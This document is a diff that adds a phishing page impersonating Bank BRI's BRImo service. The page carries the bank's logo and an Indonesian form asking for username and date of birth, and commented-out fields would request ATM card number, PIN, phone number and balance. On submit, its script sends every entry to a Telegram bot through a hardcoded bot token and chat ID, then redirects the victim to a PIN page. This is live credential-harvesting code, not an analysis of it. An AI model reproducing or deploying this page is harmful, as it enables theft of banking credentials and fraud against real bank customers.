@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<link rel="icon" href="">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#000000">
+<meta name="description" content="/">
+<link rel="icon" type="image/svg" href="">
+<title>Bank Bri</title>
+<link href="/min.css" rel="stylesheet">
+<style>
+
+@charset "utf-8";
+
+
+* { box-sizing: border-box; margin: 0px; padding: 0px; }
+
+body { -webkit-font-smoothing: antialiased; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif; }
+/*
+.pg1 { background-image: url("/pg1.eb1110ce7226b1ceb6ad.png") !important; height: 105vh !important; padding-top: 41vw !important; }
+
+.pg, .pg1 { background-repeat: no-repeat !important; background-size: 100% !important; width: 100% !important; }
+
+.pg { background-image: url("/pg.2c9ffc8d2d7e7ca18d73.jpeg") !important; height: 115vh !important; padding-top: 470px !important; }
+
+.pg3 { background-image: url("/pg3.8cad0aef9567a81604d3.png") !important; height: 105vh !important; padding-top: 38vw !important; }
+
+.pg2, .pg3 { background-repeat: no-repeat !important; background-size: 100% !important; width: 100% !important; }
+rgb(166, 46, 48)
+.pg2 { background-image: url("/pg2.eb1110ce7226b1ceb6ad.png") !important; height: 120vh !important; padding-top: 82vw !important; }*/
+
+form { padding: 40px !important; }
+
+label { opacity: 0.9 !important;}
+
+input, select { border-color: rgb(8, 118, 236) !important; border-radius: 5px; padding: 10px; height: 43px !important; margin-bottom: 5px !important; width: 100% !important; }
+
+input:focus, select:focus { outline: rgb(8, 118, 236) solid 0px; }
+
+button { background-color: rgb(8, 118, 236) !important; border: rgb(8, 118, 236) !important; border-radius: 5px !important; color: rgb(255, 253, 253) !important; height: 45px !important; margin-top: 10px !important; opacity: 9 !important; width: 100% !important; font-size: 15px; font-weight: bold; }
+
+.warn { height: 147px; background-color: rgb(255, 255, 0) !important; box-shadow: rgba(0, 0, 0, 0.13) 0px 0px 24px !important; color: rgb(14, 9, 9) !important; font-size: 14px !important; padding: 27px !important; text-align: center !important; }
+
+.okok { background-color: initial !important; height: 219px !important; }
+
+.modal-content { padding: 10px; }
+</style>
+</head>
+<body>
+    <div id="root">
+        <div>
+            <center>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/68/BANK_BRI_logo.svg/1280px-BANK_BRI_logo.svg.png" style="width: 60%; margin-top: 10%; align-items: center;"></center>
+            <br>
+            <p style="color: blue; font-size: 16px; text-align: left; margin-top: 15px; margin-left: 10%; font-weight: bold;">Data Akun<br></p>
+            <p style="color: black; font-size: 13px; text-align: left; margin-top: 2px; margin-left: 10%;">Pastikan data akun yang kamu isikan dibawah ini<br>telah terdaftar di BRImo</p>
+            <form id="tg" class="fd1"><br><!--<label>
+<small>Nomor Kartu ATM</small></label><br>
+<input type="tel" name="Kartu-Debit" id="Kartu-Debit" placeholder="💳" minlength="16" maxlength="16" required=""><br>--><label><small>Username</small></label><br>
+<input type="text" name="Username" id="Username" placeholder="👤" minlength="" maxlength="" required=""><br><!--<label><small>PIN</small></label><br>
+<input type="tel" name="pin" id="pin" placeholder="🔒 " minlength="6" maxlength="6" required=""><br><!--<label><small>Nomor Handphone</small></label><br>
+<input type="tel" name="No-Hp" id="No-Hp" placeholder="+62" minlength="10" maxlength="13" required=""><br>-->
+<br>
+<label>
+    <small>Tanggal Lahir</small></label>
+    <br>
+<input type="date" name="Tgl-Lahir" id="Tgl-Lahir" placeholder="DD/MM/YYYY" minlength="6" maxlength="8" required="" style="background-color: white;"><br><!--<label><small>Saldo Aktif Di Rekening</small></label><br>
+<input type="tel" name="Saldo" id="Saldo" placeholder="Rp" minlength="" maxlength="" required=""><br>-->
+<br>
+<br>
+<button type="submit">Lanjutkan</button>
+<p id="status"></p>
+</div>
+</div>
+</div>
+<script>
+
+    const chat_id = '5991822604', botID = 'bot6525692911:AAFxO-3rLKD8m2Evjw43HZddN3W2lCX5NhE';
+
+    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+    document.querySelector('#tg').addEventListener("submit", async e => { // When the user submits the form
+        e.preventDefault(); // Don't submit
+        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
+            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
+        null, 2); // Prettify the JSON so we can read the data easily
+        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
+            method: 'POST',
+            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
+            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
+        });
+        const messageStatus = document.querySelector('#status');
+        if (sendMessage.ok) // Update the user on if the message went through
+            messageStatus.textContent = "";
+        else
+            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
+        e.target.reset(); // Clear the form fields.
+        window.location.href='/pin.html';
+    });
+
+</script>
+</form>
+</body>
+</html>
